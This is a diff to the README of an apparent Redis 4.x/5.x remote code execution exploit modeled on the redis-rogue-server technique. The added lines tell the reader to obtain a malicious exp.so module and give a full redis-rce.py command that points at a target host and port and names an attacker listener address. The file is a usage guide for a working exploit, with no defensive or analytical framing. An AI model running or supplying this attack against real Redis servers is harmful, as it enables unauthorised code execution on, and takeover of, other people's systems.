@@ -1,5 +1,8 @@
 # Redis RCE
 
+Take exp.so file from here : [https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server), 
+and use command like this : python redis-rce.py -r 192.168.120.69 -L 192.168.45.231 -f ../redis-rogue-server/exp.so -p 6379 -P 6379
+
 A exploit for Redis 4.x/5.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).
 
 This repo is a modified version of <https://github.com/n0b0dyCN/redis-rogue-server> .
